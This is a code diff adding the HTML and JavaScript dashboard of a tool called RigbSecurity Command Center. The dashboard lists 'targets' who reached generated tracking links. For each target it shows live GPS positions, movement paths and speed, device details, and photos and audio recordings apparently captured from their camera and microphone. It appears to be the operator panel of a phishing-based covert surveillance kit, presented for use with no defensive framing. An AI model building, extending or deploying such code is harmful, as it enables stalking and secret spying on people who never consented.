@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>RigbSecurity — Command Center</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Courier New',monospace;background:#0a0e17;color:#c0c8d8}
+.layout{display:grid;grid-template-columns:300px 1fr 340px;height:100vh}
+.panel{background:#0d1117;overflow-y:auto}
+.panel-l{border-right:1px solid #1a2233}.panel-r{border-left:1px solid #1a2233}
+.ph{padding:14px;border-bottom:1px solid #1a2233;position:sticky;top:0;background:#0d1117;z-index:10}
+.ph h1{font-size:13px;color:#58a6ff;letter-spacing:1px}
+.tc{padding:12px 14px;border-bottom:1px solid #111820;cursor:pointer}.tc:hover,.tc.active{background:#161b22}
+.tc .id{font-size:12px;color:#58a6ff;font-weight:bold}.tc .tpl{font-size:10px;color:#666;text-transform:uppercase}
+.tc .co{font-size:11px;color:#7ee787;margin-top:3px;font-family:'Courier New'}.tc .mt{font-size:10px;color:#444;margin-top:3px}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px;vertical-align:middle}
+.on{background:#7ee787;box-shadow:0 0 6px #7ee787}.off{background:#555}.stale{background:#d29922}
+.cbtn{display:block;width:calc(100% - 28px);margin:10px 14px;padding:9px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:12px;cursor:pointer;font-family:'Courier New'}
+#map{width:100%;height:100%}
+.ov{position:absolute;top:10px;left:10px;z-index:1000;background:rgba(13,17,23,.9);border:1px solid #1a2233;border-radius:6px;padding:8px 12px}
+.ov .s{font-size:10px;color:#888;margin-bottom:3px}.ov .s span{color:#58a6ff;font-weight:bold}
+.ds{padding:12px 14px;border-bottom:1px solid #111820}.ds h3{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+.dr{display:flex;justify-content:space-between;font-size:11px;margin-bottom:3px}.dr .l{color:#666}.dr .v{color:#c9d1d9}.dr .vg{color:#7ee787}
+.mg{display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;padding:0 14px 10px}
+.mg img{width:100%;aspect-ratio:1;object-fit:cover;border-radius:3px;cursor:pointer;border:1px solid #1a2233}
+.le{padding:6px 14px;font-size:10px;border-bottom:1px solid #0d1117}
+.le .c{color:#7ee787}.le .t{color:#555}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:9999;justify-content:center;align-items:center;cursor:pointer}
+.modal.active{display:flex}.modal img{max-width:90%;max-height:90%;border-radius:8px}
+@media(max-width:900px){.layout{grid-template-columns:1fr;grid-template-rows:auto 50vh auto}}
+</style>
+</head>
+<body>
+<div class="layout">
+<div class="panel panel-l"><div class="ph"><h1>📡 RIGBSECURITY</h1><div id="cnt" style="font-size:10px;color:#555">Loading...</div></div><button class="cbtn" onclick="location.href='/api/create?template=generic'">+ New Link (API)</button><div id="tl"></div></div>
+<div style="position:relative"><div id="map"></div><div class="ov"><div class="s">Active: <span id="sA">0</span></div><div class="s">Locations: <span id="sL">0</span></div><div class="s">Photos: <span id="sP">0</span></div></div></div>
+<div class="panel panel-r"><div class="ph"><h2 id="dT" style="font-size:13px;color:#58a6ff">Select target</h2></div><div id="dC"><div class="ds"><p style="color:#555;font-size:11px;text-align:center;padding:30px 0">Click a target</p></div></div></div>
+</div>
+<div class="modal" id="im" onclick="this.classList.remove('active')"><img id="mi" src=""/></div>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+let D={},sel=null,markers={},paths={};
+const map=L.map('map',{center:[39.8,-98.5],zoom:4,attributionControl:false});
+L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19}).addTo(map);
+function ci(c,p){return L.divIcon({className:'',html:`<div style="width:12px;height:12px;background:${c};border-radius:50%;border:2px solid #fff;box-shadow:0 0 ${p?10:3}px ${c}"></div>`,iconSize:[12,12],iconAnchor:[6,6]})}
+function ago(t){const s=Math.floor((Date.now()-new Date(t).getTime())/1000);if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';if(s<86400)return Math.floor(s/3600)+'h';return Math.floor(s/86400)+'d'}
+function gs(l){if(!l)return{c:'off',t:'No data'};const a=Date.now()-new Date(l.ts).getTime();if(a<120000)return{c:'on',t:'Live'};if(a<3600000)return{c:'stale',t:'Recent'};return{c:'off',t:'Offline'}}
+
+async function load(){try{const r=await fetch('/api/all-targets');D=await r.json();render();updateMap();stats()}catch(e){}}
+function render(){const el=document.getElementById('tl');const ids=Object.keys(D);document.getElementById('cnt').textContent=ids.length+' targets';
+if(!ids.length){el.innerHTML='<div style="padding:20px 14px;text-align:center;color:#555;font-size:11px">No targets</div>';return}
+el.innerHTML=ids.map(id=>{const t=D[id],ls=t.locations||[],la=ls[ls.length-1],s=gs(la);
+return`<div class="tc ${sel===id?'active':''}" onclick="pick('${id}')"><div><span class="dot ${s.c}"></span><span class="id">${t.tracking?.name||id}</span></div><div class="tpl">${t.tracking?.template||'?'} — ${s.t}</div>${la?`<div class="co">${la.lat?.toFixed(6)}, ${la.lon?.toFixed(6)}</div><div class="mt">±${la.acc?.toFixed(0)||'?'}m | ${ago(la.ts)} ago | ${ls.length} pts</div>`:'<div class="mt">No data</div>'}</div>`}).join('')}
+
+function updateMap(){Object.keys(D).forEach(id=>{const ls=D[id].locations||[];if(!ls.length)return;const la=ls[ls.length-1],s=gs(la),live=s.c==='on',c=live?'#7ee787':s.c==='stale'?'#d29922':'#555';
+if(markers[id])markers[id].setLatLng([la.lat,la.lon]).setIcon(ci(c,live));
+else{markers[id]=L.marker([la.lat,la.lon],{icon:ci(c,live)}).addTo(map);markers[id].on('click',()=>pick(id))}
+markers[id].bindPopup(`<b>${D[id].tracking?.name||id}</b><br>${la.lat.toFixed(6)},${la.lon.toFixed(6)}<br>±${la.acc?.toFixed(0)||'?'}m`);
+if(ls.length>1){const co=ls.map(l=>[l.lat,l.lon]);if(paths[id])paths[id].setLatLngs(co);else paths[id]=L.polyline(co,{color:c,weight:2,opacity:.6,dashArray:'5,8'}).addTo(map)}})}
+
+function pick(id){sel=id;render();detail(id);const ls=D[id]?.locations||[];if(ls.length){const la=ls[ls.length-1];map.setView([la.lat,la.lon],15,{animate:true})}}
+
+function detail(id){const t=D[id];if(!t)return;const ls=t.locations||[],md=t.media||[],la=ls[ls.length-1],ph=md.filter(m=>m.type==='photo'),au=md.filter(m=>m.type==='audio'),s=gs(la),dv=t.device||{};
+document.getElementById('dT').innerHTML=`<span class="dot ${s.c}"></span>${t.tracking?.name||id} <span style="font-size:10px;color:#555">${t.tracking?.template||''}</span>`;
+let h='';
+h+=`<div class="ds"><h3>Info</h3><div class="dr"><span class="l">ID</span><span class="v">${id}</span></div><div class="dr"><span class="l">Template</span><span class="v">${t.tracking?.template||'?'}</span></div><div class="dr"><span class="l">Visits</span><span class="v">${t.tracking?.visits||0}</span></div><div class="dr"><span class="l">Data</span><span class="v">${ls.length} GPS, ${ph.length} photos, ${au.length} audio</span></div></div>`;
+if(la){h+=`<div class="ds"><h3>📍 GPS Position</h3><div class="dr"><span class="l">Lat</span><span class="v vg">${la.lat?.toFixed(6)}</span></div><div class="dr"><span class="l">Lon</span><span class="v vg">${la.lon?.toFixed(6)}</span></div><div class="dr"><span class="l">Accuracy</span><span class="v">${la.acc?.toFixed(1)||'?'}m</span></div><div class="dr"><span class="l">Speed</span><span class="v">${la.spd?(la.spd*2.237).toFixed(1)+' mph':'Still'}</span></div><div class="dr"><span class="l">Updated</span><span class="v">${ago(la.ts)} ago</span></div><div style="margin-top:6px"><a href="https://maps.google.com/?q=${la.lat},${la.lon}" target="_blank" style="color:#58a6ff;font-size:10px">Google Maps ↗</a></div></div>`}
+if(Object.keys(dv).length){const bt=dv.battery||{},nt=dv.network||{};h+=`<div class="ds"><h3>📱 Device</h3><div class="dr"><span class="l">Platform</span><span class="v">${dv.platform||'?'}</span></div><div class="dr"><span class="l">Battery</span><span class="v">${bt.level||'?'}% ${bt.charging?'⚡':''}</span></div><div class="dr"><span class="l">Network</span><span class="v">${nt.effectiveType||'?'}</span></div><div class="dr"><span class="l">Timezone</span><span class="v">${dv.timezone||'?'}</span></div></div>`}
+if(ph.length){h+=`<div class="ds"><h3>📸 Photos (${ph.length})</h3></div><div class="mg">${ph.slice(-9).map(p=>`<img src="/captures/${id}/${p.filename}" onclick="document.getElementById('mi').src=this.src;document.getElementById('im').classList.add('active')" title="${p.camera} — ${new Date(p.ts).toLocaleTimeString()}">`).join('')}</div>`}
+if(au.length){h+=`<div class="ds"><h3>🎙️ Audio (${au.length})</h3></div>${au.slice(-5).map(a=>`<div style="padding:4px 14px;display:flex;align-items:center;gap:6px"><audio controls preload="none" src="/captures/${id}/${a.filename}" style="height:26px;flex:1"></audio><span style="font-size:9px;color:#555">${new Date(a.ts).toLocaleTimeString()}</span></div>`).join('')}`}
+if(ls.length){h+=`<div class="ds"><h3>📋 History (last 15)</h3></div>${ls.slice(-15).reverse().map(l=>`<div class="le"><span class="c">${l.lat?.toFixed(6)}, ${l.lon?.toFixed(6)}</span> <span style="color:#d29922">±${l.acc?.toFixed(0)||'?'}m</span><br><span class="t">${new Date(l.ts).toLocaleString()}</span></div>`).join('')}`}
+document.getElementById('dC').innerHTML=h}
+
+function stats(){const ids=Object.keys(D);let tl=0,tp=0,ac=0;ids.forEach(id=>{const ls=D[id].locations||[],md=D[id].media||[];tl+=ls.length;tp+=md.filter(m=>m.type==='photo').length;if(ls.length){const a=Date.now()-new Date(ls[ls.length-1].ts).getTime();if(a<120000)ac++}});
+document.getElementById('sA').textContent=ac;document.getElementById('sL').textContent=tl;document.getElementById('sP').textContent=tp}
+
+load();setInterval(load,10000);
+try{const pr=location.protocol==='https:'?'wss:':'ws:';const ws=new WebSocket(pr+'//'+location.host+'/ws/dashboard');ws.onmessage=e=>{const d=JSON.parse(e.data);if(d.type==='gps'&&D[d.tid]){if(!D[d.tid].locations)D[d.tid].locations=[];D[d.tid].locations.push(d.entry);render();updateMap();stats();if(sel===d.tid)detail(d.tid)}if(d.type==='media'&&D[d.tid]){if(!D[d.tid].media)D[d.tid].media=[];D[d.tid].media.push(d.entry);if(sel===d.tid)detail(d.tid);stats()}if(d.type==='device'&&D[d.tid]){D[d.tid].device=d.data;if(sel===d.tid)detail(d.tid)}};ws.onclose=()=>setTimeout(()=>location.reload(),5000)}catch(e){}
+</script>
+</body>
+</html>
